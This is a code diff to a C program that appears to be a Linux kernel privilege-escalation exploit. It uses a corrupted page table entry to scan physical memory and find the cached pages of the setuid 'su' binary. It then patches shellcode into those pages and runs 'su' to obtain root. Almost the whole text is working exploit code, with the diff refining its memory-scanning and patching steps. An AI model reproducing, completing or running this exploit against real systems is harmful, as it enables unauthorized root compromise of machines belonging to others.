@@ -480,12 +480,16 @@ int main()
 	uint8_t *glitched_map = NULL;
 
 	// loop twice to make sure the tlb/cache gets busted (may be unnecessary)
-	for (int k=0; k<2; k++) {
+	//for (int k=0; k<2; k++) {
 		for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
 			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
 				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
-				*glitched_pte; // read to keep it in cache?
+				//*glitched_pte; // read to keep it in cache?
 				if (ptr == glitched_pte) continue;
+				if (*ptr == *glitched_pte) {
+					printf("[-] That's not supposed to happen\n");
+					return -1;
+				}
 				if (*ptr != 0x4141414141414141) {
 					printf("Found it!\n");
 					printf("%p\n", (void*)ptr);
@@ -496,7 +500,7 @@ int main()
 				}
 			}
 		}
-	}
+	//}
 
 	if (glitched_map == NULL) {
 		printf("[-] Failed to find corresponding mapping :(\n");
@@ -508,37 +512,36 @@ int main()
 	printf("[*] Priming the 'su' page cache\n");
 	system("su --help > /dev/null");
 
+	int found = 0;
 	for (uintptr_t paddr = PHYS_MEM_BASE; paddr < PHYS_MEM_END; paddr += 0x1000) {
 		*glitched_pte = (*glitched_pte & 0x8000000000000fff) | paddr;
 		//printf(".");
 		//fflush(stdout);
 
 
-		/*for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
-			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
-				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
-				*glitched_pte; // read to keep it in cache?
-				if (ptr == glitched_pte) continue;
-				if (*ptr != 0x4141414141414141) {
-					printf("Found it! (again)\n");
-				}
-			}
-		}*/
-		sleep(0);
-		
+		for (size_t i = 0; i < 2048; i++) { // enough to flush TLB
+			volatile uint64_t * volatile ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE);
+			*glitched_pte; // read to keep it in cache?
+			*ptr;
+		}
+
+		printf("\rScanning physmem %lu%%", (paddr-PHYS_MEM_BASE)*100/(PHYS_MEM_END-PHYS_MEM_BASE));
 	
 		//printf("0x%lx\n", paddr);
 		//hexdump(glitched_map, 16);
-
 		if (memcmp(glitched_map, target+1, 0x1000) == 0) {
-			printf("[+] Found target at phys addr 0x%016lx\n", paddr);
+			printf("\n[+] Found target at phys addr 0x%016lx, patching.\n", paddr);
+			found = 1;
 			memcpy(glitched_map+0x1d0, shellcode, sizeof(shellcode));
 		}
 	}
 
-	printf("bye\n");
-
 	*glitched_pte = orig_pte; // maybe make linux happier
 
+	if (!found) {
+		printf("\n[-] Failed to find patch site\n");
+	}
+
+	printf("\n[+] About to get root?\n");
 	system("su");
 }
